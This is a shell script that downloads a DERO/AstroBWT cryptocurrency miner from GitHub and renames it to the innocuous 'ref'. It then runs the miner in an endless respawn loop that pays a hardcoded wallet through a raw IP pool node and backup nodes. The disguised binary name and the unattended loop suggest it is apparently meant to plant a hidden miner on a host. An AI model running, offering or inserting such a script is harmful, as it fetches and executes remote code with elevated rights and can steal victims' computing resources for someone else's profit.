#!/bin/sh
sudo yum install wget
wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9.1/astrominer-V1.9.1.R2_aarch64_linux.tar.gz -O avz.tar.gz
tar xzvf avz.tar.gz
rm avz.tar.gz
mv astrominer ref
chmod +x ref
while true; do ./ref -w dero1qyjrpntvr5g7njsg5wh652m42qrzljlnrqljc4xlgdz9d4kj7g9dvqqtcr6xr -r 64.226.88.232:10100 -r1 dero-node-yashnik-eu.mysrv.cloud:10300 -r2 dero-node.mysrv.cloud:10300 -report-realtime-hashrate; done
